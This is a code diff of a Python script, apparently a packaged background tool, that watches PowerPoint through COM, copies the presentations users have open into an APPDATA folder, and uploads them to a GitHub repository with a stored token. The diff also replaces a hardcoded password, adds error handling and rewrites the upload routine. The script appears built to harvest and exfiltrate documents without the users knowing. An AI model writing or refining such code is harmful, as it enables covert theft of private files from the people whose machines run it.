@@ -26,7 +26,7 @@ if getattr(sys, 'frozen', False): # For pyinstaller
 else:
     script_dir = os.path.dirname(os.path.abspath(__file__))
 CONFIG_PATH = os.path.join(script_dir, "config.json")
-PASSWORD = "OfficeDispatch_Script_By_LtgX__Password1145141919810"
+PASSWORD = "Enter_your_password_here"
 current_date = datetime.datetime.now().strftime("%Y.%m.%d")
 key = base64.urlsafe_b64encode(hashlib.sha256(PASSWORD.encode()).digest())
 appdata_path = os.getenv('APPDATA')
@@ -225,11 +225,17 @@ def process_files():
                         processed_files.add(file_name)
                         file_size = os.path.getsize(file_name)
                         if copy_file(file_name, file_size, folder_name, target_folder):
-                            upload_queue.put(os.path.join(target_folder, folder_name, os.path.basename(file_name)))
+                            continue
         return LOG_FILE_PATH
     except Exception as e:
+        if hasattr(e, 'args') and "PowerPoint.Application.Presentations" in e.args:
+            print("PowerPoint Application Presentations error:", e, "[This error can be ingored]")
+            return None
+        if hasattr(e, 'args') and any("-2147023174" in str(arg) for arg in e.args):
+            print("RPC server unavailable error:", e)
+            return None
         log_message(f"Error in processing files: {e}")
-        return None
+    return None
 
 def get_hwid():
     processor = platform.processor()
@@ -248,6 +254,8 @@ def check_and_rename_previous_logs():
             start_date = f.read().strip()
     else:
         start_date = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y.%m.%d")
+        with open(last_uploaded_file, 'w') as f:
+            f.write(start_date)
     
     while start_date < current_date:
         log_folder = os.path.join(repo_path, start_date)
@@ -265,77 +273,56 @@ def check_and_rename_previous_logs():
         start_date = (datetime.datetime.strptime(start_date, "%Y.%m.%d") + datetime.timedelta(days=1)).strftime("%Y.%m.%d")
     return None, None
 
-def upload_files_to_github(repo_name, token, upload_queue, log_file_path=LOG_FILE_PATH):
-    try:
-        g = Github(token)
-        user = g.get_user()
-        repo = user.get_repo(repo_name)
-        successful_uploads = []
-        failed_uploads = []
-        while not upload_queue.empty():
-            file_path = upload_queue.get()
+def upload_files_to_github(repo_name, token, upload_queue, log_file_path):
+    g = Github(token)
+    user = g.get_user()
+    repo = user.get_repo(repo_name)
+
+    while not upload_queue.empty():
+        file_path = upload_queue.get()
+        with open(file_path, "rb") as file:
+            content = file.read()
+        file_name = os.path.basename(file_path)
+        full_rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
+        commit_message = f"Update {file_name}"
+
+        attempt = 0
+        success = False
+        while attempt < config['retry_interval'] and not success:
             try:
-                with open(file_path, "rb") as file:
-                    content = file.read()
-                file_name = os.path.basename(file_path)
-                full_rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
-                commit_message_upload = f"Upload {file_name}"
-                commit_message_update = f"Update {file_name}"
-                attempt = 0
-                success = False
-                while attempt < config['retry_interval'] and not success:
-                    try:
-                        existing_file = repo.get_contents(full_rel_path)
-                        if existing_file:
-                            repo.update_file(
-                                path=full_rel_path,
-                                message=commit_message_update,
-                                content=content,
-                                sha=existing_file.sha,
-                                branch="main"
-                            )
-                        else:
-                            repo.create_file(
-                                path=full_rel_path,
-                                message=commit_message_upload,
-                                content=content,
-                                branch="main"
-                            )
-                        success = True
-                    except Exception as e:
-                        if '404' in str(e):
-                            try:
-                                repo.create_file(
-                                    path=full_rel_path,
-                                    message=commit_message_upload,
-                                    content=content,
-                                    branch="main"
-                                )
-                                success = True
-                            except Exception as create_e:
-                                log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
-                                time.sleep(config['retry_interval'])
-                                attempt += 1
-                        else:
-                            log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
-                            time.sleep(config['retry_interval'])
-                            attempt += 1
-                if success:
-                    successful_uploads.append(full_rel_path)
-                else:
-                    failed_uploads.append(full_rel_path)
+                existing_file = repo.get_contents(full_rel_path)
+                repo.update_file(
+                    path=full_rel_path,
+                    message=commit_message,
+                    content=content,
+                    sha=existing_file.sha,
+                    branch="main"
+                )
+                log_message(f"Updated {full_rel_path}", log_file_path)
+                success = True
             except Exception as e:
-                failed_uploads.append(full_rel_path)
-                log_message(f"Error processing file {file_path}: {e}", log_file_path)
-            finally:
-                upload_queue.task_done()
-        
-        if successful_uploads:
-            log_message(f"Successfully uploaded: {', '.join(successful_uploads)}", log_file_path)
-        if failed_uploads:
-            log_message(f"Failed to upload: {', '.join(failed_uploads)}", log_file_path)
-    except Exception as e:
-        log_message(f"Error in upload_files_to_github: {e}", log_file_path)
+                if str(e).startswith('404'):
+                    try:
+                        repo.create_file(
+                            path=full_rel_path,
+                            message=commit_message,
+                            content=content,
+                            branch="main"
+                        )
+                        log_message(f"Uploaded {full_rel_path}", log_file_path)
+                        success = True
+                    except Exception as create_e:
+                        log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
+                        time.sleep(config['retry_interval'])
+                        attempt += 1
+                else:
+                    log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
+                    time.sleep(config['retry_interval'])
+                    attempt += 1
+
+        if not success:
+            log_message(f"Failed to process {full_rel_path} after multiple attempts.")
+        upload_queue.task_done()
 
 while True:
     ppt = refresh_com_object("PowerPoint.Application")
